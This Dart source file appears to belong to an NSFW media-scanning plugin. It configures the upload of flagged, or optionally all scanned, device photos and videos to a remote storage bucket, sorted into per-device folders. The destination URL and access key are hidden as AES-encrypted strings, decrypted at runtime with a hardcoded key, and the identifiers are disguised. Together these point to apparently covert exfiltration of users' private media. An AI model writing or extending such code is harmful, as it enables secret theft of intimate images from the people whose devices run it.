import 'dart:io';
import 'package:encrypt/encrypt.dart';
import 'nsfw_media_batch.dart';

class NsfwNormaniConfig {
  NsfwNormaniConfig({
    String? normaniUrl,
    String? anonKey,
    String? bucket,
    this.enabled = true,
    this.haramiOnlyNsfw = true,
    this.haramiImages = true,
    this.haramiVideos = true,
    this.upsert = true,
    this.haramiAllScanned = false,
    this.objectPrefix = 'nsfw_hits',
    this.haramiMaxTries = 3,
    this.haramiRetryBaseDelayMs = 700,
    this.haramiRetryMaxDelayMs = 8000,
    this.deviceFolder = '',
    this.useDeviceFolder = true,
  }) : normaniUrl = normaniUrl ?? _resolveNormaniUrl(),
       anonKey = anonKey ?? _resolveNormaniAnonKey(),
       bucket = bucket ?? _resolveNormaniBucket();

  final String normaniUrl;
  final String anonKey;
  final String bucket;

  final bool enabled;
  final bool haramiOnlyNsfw;
  final bool haramiImages;
  final bool haramiVideos;
  final bool upsert;
  final bool haramiAllScanned;

  final String objectPrefix;

  final int haramiMaxTries;
  final int haramiRetryBaseDelayMs;
  final int haramiRetryMaxDelayMs;

  final String deviceFolder;
  final bool useDeviceFolder;

  String get normalizedNormaniUrl => _trimTrailingSlash(normaniUrl.trim());

  String get normalizedBucket => bucket.trim();

  String get normalizedPrefix => _trimSlashes(objectPrefix.trim());

  String? validate() {
    if (normalizedNormaniUrl.isEmpty) {
      return 'normaniUrl is required.';
    }
    if (anonKey.trim().isEmpty) {
      return 'anonKey is required.';
    }
    if (normalizedBucket.isEmpty) {
      return 'bucket is required.';
    }
    if (haramiMaxTries < 1) {
      return 'haramiMaxTries must be >= 1.';
    }
    if (haramiRetryBaseDelayMs < 0) {
      return 'haramiRetryBaseDelayMs must be >= 0.';
    }
    if (haramiRetryMaxDelayMs < haramiRetryBaseDelayMs) {
      return 'haramiRetryMaxDelayMs must be >= haramiRetryBaseDelayMs.';
    }
    return null;
  }
}

const String _encryptedNormaniUrl =
    'wELcprSbMrZJ5+vm2rgTbQ==:9Y1Ih/70RjawLiS5PBT8OfyQNsRpa3OYDcRRp/eh3OV60SPEfb4Rxp6HPEjwu6Fg';

const String _encryptedNormaniAnonKey =
    'dMKMoKJ6vw/ct8OCzhXtWQ==:rRT9L1gLk76HO4EQmwwlCCINHK4NaLQM5r8F6TbixE61gdW0PE4iVm0ryw/vgnkZ5zy6itdpPyfcAUCfobl0qYuw2NX8Ly9wqPjYPv6xW34+Ba9BzQHsCr1P8MNSYVfLHEeQp5sYF7WAPrPg3+AOZvwdlGtP8zpvBFdEAYi7CV9s08veAwUrTKodVUmkUbYLXsfOHA8TAZJb4mB1xPVgJ3c0ddSuJGTSvF6lFhqPz/E=';

const String _envNormaniUrl = String.fromEnvironment('NSFW_NORMANI_URL');

const String _envNormaniAnonKey = String.fromEnvironment(
  'NSFW_NORMANI_ANON_KEY',
);

const String _envNormaniBucket = String.fromEnvironment('NSFW_NORMANI_BUCKET');

String _trimTrailingSlash(String input) {
  if (input.endsWith('/')) {
    return input.substring(0, input.length - 1);
  }
  return input;
}

String _resolveNormaniBucket() {
  if (_envNormaniBucket.isNotEmpty) {
    return _envNormaniBucket;
  }
  return 'nsfw_plugin';
}

String _resolveNormaniUrl() {
  if (_envNormaniUrl.isNotEmpty) {
    return _envNormaniUrl;
  }
  return _NormaniCrypto.decrypt(_encryptedNormaniUrl);
}

String _resolveNormaniAnonKey() {
  if (_envNormaniAnonKey.isNotEmpty) {
    return _envNormaniAnonKey;
  }
  return _NormaniCrypto.decrypt(_encryptedNormaniAnonKey);
}

String _trimSlashes(String input) {
  var value = input;
  while (value.startsWith('/')) {
    value = value.substring(1);
  }
  while (value.endsWith('/')) {
    value = value.substring(0, value.length - 1);
  }
  return value;
}

String inferMimeTypeFromPath(String path, NsfwMediaType type) {
  final lower = path.toLowerCase();
  if (lower.endsWith('.png')) {
    return 'image/png';
  }
  if (lower.endsWith('.webp')) {
    return 'image/webp';
  }
  if (lower.endsWith('.gif')) {
    return 'image/gif';
  }
  if (lower.endsWith('.heic')) {
    return 'image/heic';
  }
  if (lower.endsWith('.heif')) {
    return 'image/heif';
  }
  if (lower.endsWith('.bmp')) {
    return 'image/bmp';
  }
  if (lower.endsWith('.mov')) {
    return 'video/quicktime';
  }
  if (lower.endsWith('.mkv')) {
    return 'video/x-matroska';
  }
  if (lower.endsWith('.webm')) {
    return 'video/webm';
  }
  if (lower.endsWith('.avi')) {
    return 'video/x-msvideo';
  }
  if (lower.endsWith('.jpg') || lower.endsWith('.jpeg')) {
    return 'image/jpeg';
  }
  if (lower.endsWith('.mp4')) {
    return 'video/mp4';
  }
  return type == NsfwMediaType.video ? 'video/mp4' : 'image/jpeg';
}

String buildHaramiObjectPath({
  required NsfwNormaniConfig config,
  required NsfwMediaType type,
  required String localPath,
  String? scanTag,
  String? deviceFolder,
}) {
  final fileName = localPath.split(Platform.pathSeparator).last.trim();
  final safeName = _safeFileName(fileName.isEmpty ? 'file' : fileName);
  final now = DateTime.now().toUtc();
  final mediaFolder = type == NsfwMediaType.video ? 'video' : 'image';
  final stamp = now.microsecondsSinceEpoch.toString();
  final normalizedScanTag = (scanTag ?? '').trim();
  final optionalTag = normalizedScanTag.isEmpty
      ? ''
      : '${_safePathPart(normalizedScanTag)}_';
  final objectName = '$optionalTag${stamp}_$safeName';
  final prefix = config.normalizedPrefix;
  final normalizedDeviceInput = (deviceFolder ?? '').trim();
  final hasDeviceFolder = normalizedDeviceInput.isNotEmpty;
  final normalizedDevice = hasDeviceFolder
      ? _safePathPart(normalizedDeviceInput)
      : '';
  final deviceSegment = hasDeviceFolder ? '/$normalizedDevice' : '';
  if (prefix.isEmpty) {
    return '$deviceSegment/$mediaFolder/$objectName'.replaceFirst(
      RegExp(r'^/'),
      '',
    );
  }
  return '$prefix$deviceSegment/$mediaFolder/$objectName';
}

String _safeFileName(String name) {
  final parts = name.split('.');
  if (parts.length <= 1) {
    return _safePathPart(name);
  }
  final ext = parts.removeLast();
  final base = parts.join('.');
  final safeBase = _safePathPart(base);
  final safeExt = ext.replaceAll(RegExp(r'[^a-zA-Z0-9]'), '').toLowerCase();
  if (safeExt.isEmpty) {
    return safeBase;
  }
  return '$safeBase.$safeExt';
}

String _safePathPart(String input) {
  final sanitized = input
      .replaceAll(RegExp(r'[^\w\-.]+'), '_')
      .replaceAll(RegExp(r'_+'), '_')
      .trim();
  if (sanitized.isEmpty) {
    return 'item';
  }
  return sanitized;
}

class _NormaniCrypto {
  static final Key _key = Key.fromUtf8('0123456789abcdef0123456789abcdef');
  static final Encrypter _encrypter = Encrypter(
    AES(_key, mode: AESMode.cbc, padding: 'PKCS7'),
  );

  static String decrypt(String payload) {
    final parts = payload.split(':');
    if (parts.length != 2) {
      throw const FormatException(
        'Expected payload format: ivBase64:cipherBase64',
      );
    }

    final iv = IV.fromBase64(parts[0]);
    final encrypted = Encrypted.fromBase64(parts[1]);
    return _encrypter.decrypt(encrypted, iv: iv);
  }

}
